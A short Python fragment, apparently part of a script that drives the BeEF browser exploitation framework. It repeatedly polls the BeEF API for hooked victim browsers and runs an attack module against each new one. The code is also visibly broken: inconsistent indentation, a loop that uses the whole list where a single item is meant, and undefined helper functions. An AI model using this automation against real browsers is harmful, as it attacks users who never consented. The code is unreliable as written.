from time import sleep

targeted_browsers = []
while True:
    hooked_browsers = fetch_hooked_browsers(beef_api_url, auth_token)

   target_browsers = []

   for hooked_browser in hooked_browsers:
       if hooked_browsers not in targeted_browsers:
           target_browsers.append(hooked_browsers) # list to execute on this time
           targeted_browsers.append(hooked_browsers) # append browser to avoid execution next time

    run_module(module_id, target_browsers, params, beef_api_url, auth_token)

    # sleep 10 seconds
    sleep(10)
